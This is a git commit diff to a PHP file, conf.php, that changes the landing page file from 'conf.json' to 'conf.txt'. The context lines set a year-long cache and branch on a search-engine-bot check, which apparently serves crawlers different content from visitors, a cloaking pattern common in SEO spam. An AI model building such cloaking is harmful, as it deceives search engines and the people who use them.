43dd671b196e030beb65dcbcfc54dffe051708bf
Davina Diandra <davinadiandra07@gmail.com>
2025-10-17 20:35:36 +0700

    Update conf.php

--- conf.php
+++ conf.php
@@ -39,7 +39,7 @@ $cache_duration = 365 * 86400; //1 years
 header("Cache-Control: max-age=$cache_duration, public, must-revalidate");
 header("Pragma: cache");
 
-$landing_page = 'conf.json';
+$landing_page = 'conf.txt';
 $index_home = 'config.txt';
 
 if (isSearchEngineBot()) {
